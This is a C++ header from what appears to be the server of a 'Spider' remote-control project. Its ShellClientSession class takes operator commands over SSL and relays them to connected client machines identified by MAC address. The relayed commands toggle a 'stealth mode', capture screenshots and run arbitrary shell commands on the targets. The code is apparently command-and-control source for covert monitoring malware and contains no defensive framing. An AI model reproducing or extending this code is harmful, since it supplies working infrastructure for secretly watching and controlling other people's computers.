//
// Created by doom on 29/09/17.
//

#ifndef SPIDER_SERVER_SHELLSESSION_HPP
#define SPIDER_SERVER_SHELLSESSION_HPP

#include <string>
#include <Server/CommandableSession.hpp>
#include <Server/SpiderClientSession.hpp>

namespace spi
{
    class ShellClientSession : public CommandableSession
    {
    public:
        using Pointer = boost::shared_ptr<ShellClientSession>;

        template <typename ...Args>
        static auto createShared(Args &&...args)
        {
            return CommandableSession::create<ShellClientSession>(std::forward<Args>(args)...);
        }

        ShellClientSession(net::IOManager &io, net::SSLContext &ctx,
                           const std::vector<SpiderClientSession::Pointer> &clts) :
            CommandableSession(io, ctx, "shell-session"), _clients(clts)
        {
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__sendList, this, _1), proto::MessageType::RList);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleStealthMode, this, _1),
                                   proto::MessageType::RStealthMode);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleActiveMode, this, _1),
                                   proto::MessageType::RActiveMode);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleScreenshot, this, _1),
                                   proto::MessageType::RScreenshot);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleRunShell, this, _1),
                                   proto::MessageType::RRunShell);
        }

        virtual ~ShellClientSession() noexcept = default;

        void startSession() noexcept
        {
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&ShellClientSession::handleHandshake,
                                       shared_from_this_cast<ShellClientSession>(),
                                       net::ErrorPlaceholder));
        }

    private:
        SpiderClientSession *__findClient(const ::net::MACAddress &id)
        {
            auto it = std::find_if(_clients.begin(), _clients.end(), [&id](const SpiderClientSession::Pointer &cur) {
                return cur->getID() == id;
            });
            return it != _clients.end() ? it->get() : nullptr;
        }

        template <typename RequestT, typename MessageT>
        void __transmitRequest(const ILoggable &loggable)
        {
            const RequestT &m = static_cast<const RequestT &>(loggable);
            ErrorCode ec;
            proto::ReplyCode repCode;

            _log(logging::Level::Debug) << m.stringify() << std::endl;

            auto client = __findClient(m.addr);
            if (client) {
                MessageT toSend;

                _log(logging::Level::Debug) << "Transmitting request to client "
                                            << client->getID().toString() << std::endl;
                client->sendCommand(toSend, ec);
                repCode.code = !ec ? proto::ReplyType::OK : proto::ReplyType::KO;
            } else {
                _log(logging::Level::Warning) << "Ignoring request: unknown client " << m.addr.toString() << std::endl;
                repCode.code = proto::ReplyType::KO;
            }

            sendCommand(repCode, ec);
            if (ec)
                _errorCb(this);
        }

        void __handleStealthMode(const ILoggable &loggable)
        {
            __transmitRequest<proto::RStealthMode, proto::StealthMode>(loggable);
        }

        void __handleActiveMode(const ILoggable &loggable)
        {
            __transmitRequest<proto::RActiveMode, proto::ActiveMode>(loggable);
        }

        void __handleScreenshot(const ILoggable &loggable)
        {
            __transmitRequest<proto::RScreenshot, proto::Screenshot>(loggable);
        }

        void __sendList([[maybe_unused]] const ILoggable &loggable)
        {
            proto::RListReply repl;

            for (const auto &cur : _clients) {
                if (cur->hasCommandConn()) {
                    repl.clients.push_back(cur->getID());
                }
            }
            ErrorCode ec;

            sendCommand(repl, ec);
            if (ec)
                _errorCb(this);
        }

        void __replyError() noexcept
        {
            proto::ReplyCode rc;

            rc.code = proto::ReplyType::KO;
            ErrorCode ec;
            sendCommand(rc, ec);
            if (ec)
                _errorCb(this);
        }

        void __handleRunShell(const ILoggable &l)
        {
            const proto::RRunShell &rrsh = static_cast<const proto::RRunShell &>(l);
            auto ptr = __findClient(rrsh.target);

            if (ptr) {
                proto::RunShell rsh;
                rsh.cmd = rrsh.cmd;

                ErrorCode ec;
                ptr->sendCommand(rsh, ec);
                if (!ec) {
//                    _asyncCmdBuff.resize(proto::MessageHeaderSize + proto::RawData::SerializedSize);
//                    ptr->asyncReceiveCommand(net::BufferView(_asyncCmdBuff.data(), _asyncCmdBuff.size()),
//                                             boost::bind(&ShellClientSession::__asyncHandleRawData,
//                                                         shared_from_this_cast<ShellClientSession>(), ptr, _1));
                } else
                    __replyError();
            } else
                __replyError();
        }

//        void __asyncHandleRawData(SpiderClientSession *cli, const ErrorCode &err)
//        {
//            if (!err) {
//                auto type = _cmdHandler.identifyMessage(_asyncCmdBuff);
//
//                if (type != proto::MessageType::RawData
//                    || _asyncCmdBuff.size() != proto::MessageHeaderSize + proto::RawData::SerializedSize) {
//                    __replyError();
//                    return;
//                }
//
//                _asyncCmdBuff.erase(_asyncCmdBuff.begin(), _asyncCmdBuff.begin() + 4);
//                proto::RawData rd(_asyncCmdBuff);
//
//                Buffer buff(rd.bytes.size());
//                ErrorCode ec;
//                cli->connection().readSome(net::BufferView(buff.data(), buff.size()), ec);
//
//                rd.bytes = spi::Serializer::unserializeBytes(buff, 0, buff.size());
//                std::string output(rd.bytes.begin(), rd.bytes.end());
//                std::cout << "Command output: " << output << ", " << rd.bytes.size() << std::endl;
//                sendCommand(rd, ec);
//                std::cout << "SENT" << std::endl;
//                if (ec)
//                    _errorCb(this);
//            }
//        }

    public:
        void sendCommand(const ILoggable &l, ErrorCode &ec) noexcept
        {
            Buffer buff;

            l.serialize(buff);
            _conn.writeSome(buff, ec);
        }

    private:
        const std::vector<SpiderClientSession::Pointer> &_clients;
        Buffer _asyncCmdBuff;
    };
}

#endif //SPIDER_SERVER_SHELLSESSION_HPP
